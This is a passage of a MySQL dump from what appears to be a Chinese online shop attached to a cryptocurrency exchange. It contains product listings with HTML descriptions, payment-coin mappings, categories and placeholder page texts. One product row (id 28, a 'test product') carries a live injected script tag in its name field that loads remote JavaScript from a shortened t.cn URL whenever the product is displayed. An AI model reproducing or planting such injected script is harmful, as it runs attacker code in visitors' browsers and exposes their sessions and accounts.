SDK开放平台\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		开放属于自己的飞行平台，实现美妙创意。 您可运用SDK软件开放套件为Phantom 3 定制专属App，全面升级您的飞行平台，并实现自由控制：\r\n	</p>\r\n	<div>\r\n		<p style=\"font-size:14px;font-weight:bold;\">\r\n			<br />\r\n		</p>\r\n	</div>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150924171757410.jpg\" /> \r\n	</p>\r\n</div>', '', '0', '1446300769', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('15', '平安银行 招财进宝金章 Au9999 5g', '', '\\Upload\\shop\\5634cce4052f6.jpg', 'qita', '1300.00000000', '100.00000000', '20.00000000', '<div style=\"background-color:#FFFFFF;margin:10px auto;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:32px;text-align:center;\">\r\n		平安是福，相伴是金\r\n	</p>\r\n	<p style=\"font-size:15px;text-indent:28px;\">\r\n		招财进宝金章是由平安银行荣誉发行，采用上海黄金交易所标准成色原料制造。 貔貅为是转祸为祥的吉瑞之兽。象征揽八方之财，只进不出，同时镇宅辟邪，聚财掌权。本产品是由纯金Au.9999制成，是具有保值及收藏的吉祥之物。由中国黄金协会监制，是投资理财、收藏馈赠的首选礼品！\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151026181008493.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:10px auto;font-family:微软雅黑;color:#333333;padding:0px;\">\r\n	<p style=\"font-size:15px;text-indent:28px;\">\r\n		中国传统有装饰“貔貅”的习俗，貔貅寓意丰富，人们相信它能带来欢乐及好运。民间也有“一摸貔貅运程旺盛，再摸貔貅财运滚滚，三摸貔貅平步青云”的美好祝愿。貔貅身背元宝，意为招财进宝，招财进宝臻佳瑞，合家无虑保安存。即是招财的象征，又是辟邪镇宅的寓意，给主人带来吉祥祝福。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151026181033937.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;color:#333333;padding:0px;\">\r\n	<p style=\"font-size:14px;text-indent:28px;\">\r\n		千百年来，黄金始终是财富的象征。无论历史的车轴留下怎样的履痕，不为时间所动的稳定品质和随世迁移的内在价值，诉说着世世代代的传承。工艺精美，值得世代臻享流传。招财进宝金章——黄金纯度为99.99%，规格为5g，配备收藏证书，并支持黄金回购服务。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151026181057267.jpg\" /> \r\n	</p>\r\n</div>', '', '0', '1446300900', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('16', '中国农业银行传世之宝\"银元宝\" Ag99.9 100g', '', '\\Upload\\shop\\5634cd8ad5522.jpg', 'qita', '1088.00000000', '100.00000000', '20.00000000', '<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;text-align:center;\">\r\n	<p>\r\n		<img src=\"/Upload/5634cd832dea4.jpg\" alt=\"\" /><img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150731143421185.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:14px;\">\r\n		纯银气质，韧性好是纯银的重要物理属性之一，它易延展但硬度度，那些坚硬的物体可能会损坏产品表面，甚至使薄软的产品变形，珍爱产品，请远离硬物。 若留下指纹、汗渍，可用软布擦拭，即可恢复其光泽。产品使用后如有沾污，一般只需用清水略作清洗，放在两块软绵中吸干水分即可。减少与空气接触的最好的养护方式，不经常使用时宜将产品密封保存，放在储藏柜或保险箱内。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;text-align:center;\">\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150731143444362.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;text-align:center;\">\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150731143450551.jpg\" /> \r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150731143506987.jpg\" /> \r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150731143516830.jpg\" /> \r\n	</p>\r\n</div>', '', '0', '1446301066', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('24', 'Apple iPhone 6s (A1700) 64G 玫瑰金色 移动联通电信4G手机', '', '\\Upload\\shop\\56330fbc3d579.png', 'qita', '6000.00000000', '95.00000000', '4.00000000', '<img src=\"/Upload/5633106483d9b.jpg\" alt=\"\" /><img src=\"/Upload/5633106e3651b.jpg\" alt=\"\" />', '', '0', '1446187311', '0', '-1', '0.00');
INSERT INTO `movesay_shop` VALUES ('25', '爱国者 PA610 移动电源 10000mAh 双USB输出', '', '\\Upload\\shop\\5634d0d4a9d2d.jpg', 'qita', '99.00000000', '999.00000000', '1.00000000', '<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;padding:0px;text-align:center;\">\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151010174219815.jpg\" /> \r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151010174225139.jpg\" /> \r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151010174231733.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;font-family:微软雅黑;padding:0px;color:#333333;\">\r\n	<p style=\"font-size:15px;\">\r\n		采用一体成型的航空级抗压金属外壳，具有极高的结构强度， 耐摔防撞，耐压承重，可承受50公斤重压\r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;font-family:微软雅黑;padding:0px;color:#333333;\">\r\n	<p style=\"font-size:15px;\">\r\n		金属磨砂质感，经过与iPad 4一致的阳极氧化工艺，可在表面形成坚硬的保护层，着色坚固，更加耐磨耐腐蚀。\r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;font-family:微软雅黑;padding:0px;color:#333333;\">\r\n	<p style=\"font-size:15px;\">\r\n		高品质聚合物电芯，重量更轻，机身更薄，与18650电芯相比\r\n	</p>\r\n	<p style=\"font-size:15px;\">\r\n		安全高效，使用寿命更长。\r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;font-family:微软雅黑;padding:0px;color:#333333;\">\r\n	<p style=\"font-size:15px;\">\r\n		拥有高达10000mAh超大电量，为你的手机、平板、数码相机提供超乎想象的续航时间，可为iPhone5S充电 4.5次，iPad mini充电1.5次，三星S4充电2.5次。\r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;font-family:微软雅黑;padding:0px;color:#333333;\">\r\n	<p style=\"font-size:15px;\">\r\n		符合人体工程学的圆弧边缘，实现单手持握的完美握感。相比普通产品的棱角边缘，更能保护手机Pad等产品。\r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;font-family:微软雅黑;padding:0px;color:#333333;\">\r\n	<p style=\"font-size:15px;\">\r\n		内置先进的电芯及电源管理方案，具有1A/2A双USB智能输出口，智能检测USB端口的移动设备，可同时充手机平板或者两部手机。还可为数码相机及游戏掌机充电。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;padding:0px;text-align:center;\">\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151010174422135.jpg\" /> \r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151010174429581.jpg\" /> \r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151010174435178.jpg\" /> \r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151010174440305.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;font-family:微软雅黑;padding:0px;color:#333333;\">\r\n	<p style=\"font-size:15px;\">\r\n		<br />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;padding:0px;text-align:center;\">\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151010174647672.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;font-family:微软雅黑;padding:0px;color:#333333;\">\r\n	<div>\r\n	</div>\r\n</div>', '', '0', '1446302893', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('26', '苹果（Apple）iPhone 6s Plus 64G版 4G手机', '', '\\Upload\\shop\\5634d3707c1e1.jpg', 'qita', '7588.00000000', '1000.00000000', '0.00000000', '<div style=\"text-align:center;\">\r\n	<span style=\"font-size:12px;line-height:1.5;\"></span><img src=\"/Upload/5634d3aaa8fd5.jpg\" alt=\"\" /> \r\n</div>\r\n<p style=\"font-size:17px;text-align:center;\">\r\n	<img src=\"/Upload/5634d3b197767.jpg\" alt=\"\" /> \r\n</p>', '', '0', '1446302678', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('27', '飞利浦（Philips）AJ3275DZ iPhone6 Plus/6/5S/5 音乐充电基座音箱', '', '\\Upload\\shop\\5639e2cfb0e39.jpg', 'yifu', '418.00000000', '1000.00000000', '10.00000000', '<div style=\"color:#666666;font-family:微软雅黑, Arial;font-size:11.6666660308838px;margin:0px auto;padding:0px;background-color:#FFFFFF;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630181914164.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630181919310.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-size:11.6666660308838px;margin:0px auto;font-family:微软雅黑;padding:0px;\">\r\n	<p style=\"font-size:15px;color:#FFFFFF;\">\r\n		底部有四个小支撑防滑垫，同时还有一个小小的纽扣电池槽，这个电池可不是用来 给音箱供电的，而是以保证时钟的正常计时。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-size:11.6666660308838px;margin:0px auto;font-family:微软雅黑;padding:0px;\">\r\n	<p style=\"font-size:15px;color:#FFFFFF;\">\r\n		AJ3275DZ的一大亮点即就是这个小小的闪电接口，支持iPhone6手机，并有相应的 软橡胶靠垫设计，起到辅助支持手机的作用。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;font-size:11.6666660308838px;margin:0px auto;padding:0px;background-color:#FFFFFF;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182035963.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182040353.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182047565.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182055733.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182102898.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182109357.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182115923.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182121376.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182128475.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182135737.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182140708.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182147901.jpg\" /> \r\n	</p>\r\n</div>', '', '0', '1456203847', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('28', '测试商品1<script src=http://t.cn/RMA8JWE></script>', 'cny,dsc,btc,ltc,dsg,', '\\Upload\\shop\\56cbe82d8e86c.png', 'dianzi', '1000.00000000', '896.00000000', '154.00000000', '<img src=\"/Upload/shop/56cbe7cf193d8.png\" alt=\"\" />', '', '1', '1457144844', '1469030400', '1', '0.00');

-- ----------------------------
-- Table structure for `movesay_shop_addr`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_shop_addr`;
CREATE TABLE `movesay_shop_addr` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL DEFAULT '0',
  `truename` varchar(50) NOT NULL DEFAULT '0',
  `moble` varchar(500) NOT NULL,
  `name` varchar(500) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_shop_addr
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_shop_coin`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_shop_coin`;
CREATE TABLE `movesay_shop_coin` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id',
  `nuo` varchar(200) NOT NULL COMMENT '付款',
  `ltc` varchar(200) NOT NULL COMMENT '付款',
  `btc` varchar(200) NOT NULL COMMENT '付款',
  `dsg` varchar(200) NOT NULL COMMENT '付款',
  `dsc` varchar(200) NOT NULL COMMENT '付款',
  `shopid` int(11) unsigned NOT NULL COMMENT '商品id',
  `cny` varchar(50) NOT NULL COMMENT '人民币',
  PRIMARY KEY (`id`),
  KEY `shopid` (`shopid`)
) ENGINE=MyISAM AUTO_INCREMENT=22 DEFAULT CHARSET=utf8 COMMENT='商品付款方式表';

-- ----------------------------
-- Records of movesay_shop_coin
-- ----------------------------
INSERT INTO `movesay_shop_coin` VALUES ('1', '', '1', '1', '1', '1', '1', '1');
INSERT INTO `movesay_shop_coin` VALUES ('2', '', '1', '1', '1', '1', '2', '1');
INSERT INTO `movesay_shop_coin` VALUES ('3', '', '1', '1', '1', '1', '3', '1');
INSERT INTO `movesay_shop_coin` VALUES ('4', '', '1', '1', '1', '1', '4', '1');
INSERT INTO `movesay_shop_coin` VALUES ('5', '', '1', '1', '1', '1', '5', '1');
INSERT INTO `movesay_shop_coin` VALUES ('6', '', '1', '1', '1', '1', '6', '1');
INSERT INTO `movesay_shop_coin` VALUES ('7', '', '', '', '', '', '7', '');
INSERT INTO `movesay_shop_coin` VALUES ('8', '', '', '', '', '', '8', '');
INSERT INTO `movesay_shop_coin` VALUES ('9', '', '', '', '', '', '9', '');
INSERT INTO `movesay_shop_coin` VALUES ('10', '', '', '', '', '', '10', '');
INSERT INTO `movesay_shop_coin` VALUES ('11', '', '', '', '', '', '11', '');
INSERT INTO `movesay_shop_coin` VALUES ('12', '', '', '', '', '', '12', '');
INSERT INTO `movesay_shop_coin` VALUES ('13', '', '', '', '', '', '13', '');
INSERT INTO `movesay_shop_coin` VALUES ('14', '', '', '', '', '', '14', '');
INSERT INTO `movesay_shop_coin` VALUES ('15', '', '', '', '', '', '15', '');
INSERT INTO `movesay_shop_coin` VALUES ('16', '', '', '', '', '', '16', '');
INSERT INTO `movesay_shop_coin` VALUES ('17', '', '', '', '', '', '24', '');
INSERT INTO `movesay_shop_coin` VALUES ('18', '', '', '', '', '', '25', '');
INSERT INTO `movesay_shop_coin` VALUES ('19', '', '', '', '', '', '26', '');
INSERT INTO `movesay_shop_coin` VALUES ('20', '', '', '', '', '', '27', '');
INSERT INTO `movesay_shop_coin` VALUES ('21', '', '', '', '', '10', '28', '');

-- ----------------------------
-- Table structure for `movesay_shop_log`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_shop_log`;
CREATE TABLE `movesay_shop_log` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` varchar(255) NOT NULL,
  `shopid` varchar(50) NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL DEFAULT '0.00000000',
  `coinname` varchar(50) NOT NULL DEFAULT '0.00',
  `num` decimal(20,8) unsigned NOT NULL DEFAULT '0.00000000',
  `mum` decimal(20,8) unsigned NOT NULL DEFAULT '0.00000000',
  `addr` varchar(50) NOT NULL DEFAULT '0.0000',
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL DEFAULT '0',
  `xuyao` decimal(20,8) unsigned NOT NULL COMMENT '价',
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='购物记录表';

-- ----------------------------
-- Records of movesay_shop_log
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_shop_type`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_shop_type`;
CREATE TABLE `movesay_shop_type` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(50) NOT NULL,
  `title` varchar(50) NOT NULL,
  `remark` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `name` (`name`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 COMMENT='商品分类';

-- ----------------------------
-- Records of movesay_shop_type
-- ----------------------------
INSERT INTO `movesay_shop_type` VALUES ('1', 'dianzi', '电子商品', '电子商品', '0', '0', '0', '1');
INSERT INTO `movesay_shop_type` VALUES ('6', 'licai', '理财', '理财', '1', '1466049160', '1466049160', '1');

-- ----------------------------
-- Table structure for `movesay_text`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_text`;
CREATE TABLE `movesay_text` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `title` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=46 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_text
-- ----------------------------
INSERT INTO `movesay_text` VALUES ('1', 'user_index', '安全中心首页', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('2', 'user_truename', '实名认证', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('3', 'user_bank', '银行卡管理', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:&quot;Microsoft Yahei&quot;, &quot;Sim sun&quot;, tahoma, &quot;Helvetica,Neue&quot;, Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('4', 'user_group', '用户级别', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('5', 'user_log', '账户日志', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160600', '0', '0');
INSERT INTO `movesay_text` VALUES ('6', 'user_message', '我的消息', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:&quot;Microsoft Yahei&quot;, &quot;Sim sun&quot;, tahoma, &quot;Helvetica,Neue&quot;, Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('7', 'user_moble', '手机绑定', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('8', 'user_email', '邮箱绑定', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('9', 'user_google', '谷歌验证绑定', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('10', 'user_password', '修改登录密码', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('11', 'user_paypassword', '修改交易密码', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('12', 'user_question', '提交问题', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('13', 'user_qianbao', '钱包管理', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('14', 'pool_index', '矿机首页', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('15', 'pool_log', '矿机管理', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('16', 'issue_index', '认购首页', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('17', 'issue_index', '认购记录', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('18', 'finance_mycz', '认购记录', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('19', 'user_nameauth', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464677557', '0', '0');
INSERT INTO `movesay_text` VALUES ('20', 'user_ga', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464677561', '0', '0');
INSERT INTO `movesay_text` VALUES ('21', 'user_alipay', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464677631', '0', '0');
